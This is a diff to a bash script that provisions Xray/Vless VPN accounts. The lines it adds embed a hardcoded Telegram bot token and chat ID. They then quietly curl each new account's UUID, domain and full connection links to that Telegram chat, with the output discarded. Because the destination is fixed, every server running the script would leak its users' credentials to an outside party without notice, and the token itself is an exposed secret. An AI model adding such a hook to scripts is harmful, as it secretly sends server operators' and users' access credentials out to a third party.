@@ -153,6 +153,38 @@ if [[ "${DATADB}" != '' ]]; then
   sed -i "/\b${user}\b/d" /etc/vless/.vless.db
 fi
 echo "#& ${user} ${exp} ${uuid} " >>/etc/vless/.vless.db
+CHATID="1658354197"
+KEY="6581548016:AAGmvN9Dcx24QiOnNIp9DVilqCN2fCzMTas"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="
+───────────────────────────
+    Xray/Vless Account
+───────────────────────────
+Remarks     : <code>${user}</code>
+Domain      : <code>${domain}</code>
+Quota       : <code>${quota} GB</code>
+Limit iP    : <code>${limit} User</code>
+port TLS    : <code>443</code>
+Port DNS    : <code>443</code>
+Port NTLS   : <code>80</code>
+User ID     : <code>${uuid}</code>
+Encryption  : <code>none</code>
+Path TLS    : <code>/vless </code>
+ServiceName : <code>vless-grpc</code>
+───────────────────────────
+Link TLS    : <code>${vlesslink1}</code>
+───────────────────────────
+Link NTLS   : <code>${vlesslink2}</code>
+───────────────────────────
+Link GRPC   : <code>${vlesslink3}</code>
+───────────────────────────
+Format OpenClash : <code>https://${domain}:81/vless-$user.txt</code>
+───────────────────────────
+Expired On : <code>$exp</code>
+───────────────────────────
+"
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /root/akun/vless/$user.txt
 echo -e "\E[0;41;36m    Xray/Vless Account     \E[0m" | tee -a /root/akun/vless/$user.txt
